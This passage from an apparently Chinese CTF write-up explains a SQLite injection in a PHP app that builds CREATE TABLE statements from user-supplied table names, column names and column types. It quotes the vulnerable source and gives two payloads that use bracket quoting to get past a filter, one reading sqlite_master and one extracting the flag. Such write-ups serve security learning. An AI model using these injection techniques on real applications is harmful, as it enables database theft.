      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">&lt;=</span> len <span class="token operator">&amp;&amp;</span> len <span class="token operator">&lt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token number">0</span> <span class="token operator">&lt;</span> num <span class="token operator">&amp;&amp;</span> num <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        $<span class="token punctuation">(</span><span class="token string">'#info'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">'hidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        $<span class="token punctuation">(</span><span class="token string">'#table'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">'hidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          $<span class="token punctuation">(</span><span class="token string">'#table table'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span>`
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>columns[${i}][name]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>
              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>columns[${i}][type]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">INTEGER</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>REAL<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">REAL</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>TEXT<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>`<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
<p>有了源码，逻辑就清晰了许多，源码中有flag表创建和插入flag的操作，可以确定flag存在于数据库中，但是对于表名和flag值都是在开始包含进来的config.php里定义的。</p>
<p>在源码中的创建表相关代码可以发现，创建表时表名，列名，列类型可能存在SQL注入：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"CREATE TABLE {$tName} ("</span><span class="token punctuation">;</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"example1 TEXT, example2 TEXT"</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$column</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">', '</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"`$column` $type"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">');'</span><span class="token punctuation">;</span>

  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'CREATE TABLE `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` (`'</span> <span class="token punctuation">.</span> columnName <span class="token punctuation">.</span> <span class="token string">'` TEXT);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` VALUES ("'</span> <span class="token punctuation">.</span> ans <span class="token punctuation">.</span> <span class="token string">'");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>看一下最终拼接后的sql语句：</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> {$tName} <span class="token punctuation">(</span>example1 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> example2 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>$<span class="token keyword">column</span><span class="token punctuation">`</span> $<span class="token keyword">type</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<blockquote>
<p>sqlite_master表是SQLite的系统表。该表记录该数据库中保存的表、索引、视图、和触发器信息。每一行记录一个项目。在创建一个SQLIte数据库的时候，该表会自动创建。sqlite_master表包含5列。</p>
<ul>
<li><p>type列记录了项目的类型，如table、index、view、trigger。</p>
</li>
<li><p>name列记录了项目的名称，如表名、索引名等。</p>
</li>
<li><p>tbl_name列记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。</p>
</li>
<li><p>rootpage列记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。</p>
</li>
<li><p>sql列记录创建该项目的SQL语句。</p>
</li>
</ul>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16036081405146.jpg" alt="16036081405146"></p>
</blockquote>
<p>那我们只有只要想办法查sqlite_master表就知道flag表和对应的字段名。结合上面的sql语句，我们可以使用这种方式：</p>
<pre><code>create table aa as select xxx from xxx</code></pre><p>同时参数还经过了filter函数的处理，被检测到就显示表名非法。</p>
<p>那么通过表名，列名和类型三个地方传入payload，来拼接出我们想要执行的语句。</p>
<p>但是发现在tbname后还拼接了一些内容会造成干扰，这里可以通过 反引号 把它包裹起来，因为包裹起来的内容就成为了关键字，就相</p>
<p>于 <code>select xx as key</code>,看一下这个例子：</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16036088629436.jpg" alt="16036088629436"></p>
<p>同时反引号可以使用<code>[]</code>来替代绕过过滤。</p>
<p>payload1:</p>
<pre><code>在创建表时，表名: t AS SELECT sql [
列名: abc
列类型: ] FROM sqlite_master;</code></pre><p>这时的sql语句就是：</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> t <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> sql <span class="token punctuation">[</span> <span class="token punctuation">(</span>example1 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> example2 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> <span class="token number">abc</span> <span class="token punctuation">]</span> <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>等价于</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> t <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> sql <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span></code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16036091121226.jpg" alt="16036091121226"></p>
<p>得到了表名和列名，替换语句中的sql和sqlite_master 即可获得flag：</p>
<p>payload2:</p>
<pre><code>t AS SELECT flag_ThE_C0lumn [
abc
]FROM flag_Y0U_c4nt_GUESS;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16036091570801.jpg" alt="16036091570801"></p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>websec</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
</search>
